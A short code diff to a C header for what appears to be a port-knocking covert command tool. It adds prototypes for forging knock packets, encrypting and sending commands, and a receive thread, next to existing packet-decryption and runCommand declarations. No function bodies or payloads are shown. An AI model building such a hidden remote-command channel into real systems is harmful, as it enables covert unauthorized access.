@@ -21,6 +21,7 @@
 #include <setjmp.h>
 #include <signal.h>
 #include <sys/prctl.h>
+#include <ctype.h>
 
 #define PKT_SIZE			4096
 #define DEFAULT_TTL			128
@@ -37,6 +38,7 @@ static int knockCode[] = {8080, 8081, 8082, 8083, 8084};
 
 int ExitFlag;
 int running;
+int server;
 
 // Globals
 typedef struct
@@ -107,3 +109,13 @@ int authenticated(int ip);
 char* decryptPacket(struct tcphdr* tcp_header);
 void runCommand(char* command);
 void XOR();
+void startServer(void* Addr_Ptr, void* pcap_ptr, pthread_t *ThreadID2);
+
+//SEND 
+void client(void * Addr_Ptr, void* pcap_ptr, pthread_t *ThreadID2);
+void sendKnockCode(void * Addr_Ptr);
+void forgeKnock(int knock, void * Addr_Ptr);
+void sendCommand();
+void encryptCommand() ;
+int getCommand(char * command);
+void* recvThread(void* args);
